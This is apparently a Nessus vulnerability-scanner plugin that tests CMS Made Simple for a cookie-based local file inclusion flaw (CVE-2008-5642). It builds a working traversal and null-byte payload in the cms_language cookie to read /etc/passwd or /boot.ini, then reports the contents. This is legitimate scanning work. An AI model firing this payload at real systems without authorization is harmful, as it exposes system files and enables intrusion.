#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34992);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/05/19 17:45:33 $");

  script_cve_id("CVE-2008-5642");
  script_bugtraq_id(32535);
  script_osvdb_id(50384);
  script_xref(name:"EDB-ID", value:"7285");

  script_name(english:"CMS Made Simple admin/login.php cms_language Cookie Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to a local file include attack." );
  script_set_attribute(attribute:"description", value:
"The remote host is running CMS Made Simple, a content management
system written in PHP. 

The version of CMS Made Simple installed on the remote host fails to
sanitize user-supplied input to the 'cms_language' cookie when passed
to the 'admin/login.php' script before using it to include PHP code. 
Regardless of PHP's 'register_globals' and 'magic_quotes_gpc'
settings, an unauthenticated attacker may be able to leverage this
issue to view arbitrary files or possibly to execute arbitrary PHP
code on the remote host, subject to the privileges of the web server
user id." );
  script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"CMS Made Simple 1.4.1 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_cwe_id(22);
  script_set_attribute(attribute:"plugin_publication_date", value: "2008/12/01");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cmsmadesimple:cms_made_simple");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');
files = make_list(files, 'images/cms/xml_rss.gif');
file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";
file_pats['images/cms/xml_rss.gif'] = '^GIF[0-9]+';


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/cms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure we're looking at CMS Made Simple.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  if (
    'name="Generator" content="CMS Made Simple' >< res ||
    'This site is powered by <a href="http://www.cmsmadesimple.org">CMS Made Simple<' >< res ||
    '<!-- CMS Made Simple - Released under the GPL' >< res
  )
  {
    url = string(dir, "/admin/login.php");

    # Loop through files to look for.
    foreach file (files)
    {
      if (file[0] == '/') traversal = crap(data:"../", length:3*9) + '..';
      else traversal = '../../../';

      # nb: only the null byte is necessary, and the exploit works
      #     regardless of PHP's magic_quotes_gpc.
      exploit = string(traversal, file, "%00.html");

      set_http_cookie(name:'cms_language', value:exploit);
      req = http_mk_get_req(port:port, item:url);
      res = http_send_recv_req(port:port, req:req, exit_on_fail: 1);

      # There's a problem if we see the expected contents.
      lines = split(res[2], keep:FALSE);
      pat = file_pats[file];
      if (
        '<div class="lbfieldstext">' >< res[2] && 
        (
          ('.gif' >!< file && egrep(pattern:pat, string:res[2])) ||
          # nb: output must start with the GIF file if we tried to grab that.
          ('.gif' >< file && ereg(pattern:pat, string:lines[0]))
        )
      )
      {
        if (report_verbosity && '.gif' >!< file)
        {
          if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

          req_str = http_mk_buffer_from_req(req:req);
          report = string(
            "\n",
            "Nessus was able to exploit the issue to retrieve the contents of\n",
            "'", file, "' on the remote host using the following request :\n",
            "\n",
            "  ", str_replace(find:'\r\n', replace:'\n  ', string:req_str), "\n"
          );
          if (report_verbosity > 1)
          {
            contents = "";
            line1 = NULL;
            foreach line (lines)
            {
              if (isnull(line1)) line1 = line;
              else if (line == line1) break;

              contents += '  ' + line + '\n';
            }
            if (!egrep(pattern:pat, string:contents)) contents = res[2];

            report += string(
              # nb: there's already an extra blank line.
              "Here are the contents :\n",
              "\n",
              contents
            );
          }
          security_warning(port:port, extra:report);
        }
        else security_warning(port);

        exit(0);
      }
    }
  }
}
